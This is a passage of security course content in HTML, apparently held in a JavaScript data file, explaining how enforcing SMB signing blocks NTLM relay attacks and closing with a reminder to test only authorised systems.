<p>Even when a defender can't prevent every credential capture outright, enforcing SMB signing (requiring every SMB message to be cryptographically signed) defeats <strong>NTLM relay</strong> attacks — where a captured or intercepted NTLM authentication attempt is relayed to a different target rather than cracked offline. This is the second line of defense behind disabling LLMNR/NBT-NS: even if a hash is captured via Responder, SMB signing stops that hash/session from being relayed into unauthorized access elsewhere on the network.</p>

<h3>Authorization is the constant</h3>
<p>None of the defenses above change the core rule from Foundations, Ethics &amp; Legal: only run any technique from this topic against systems you own, or that you have explicit, written, in-scope authorization to test — with network-wide MITM/poisoning techniques named specifically, given how far their effects reach beyond a single "target."</p>
`}

]});
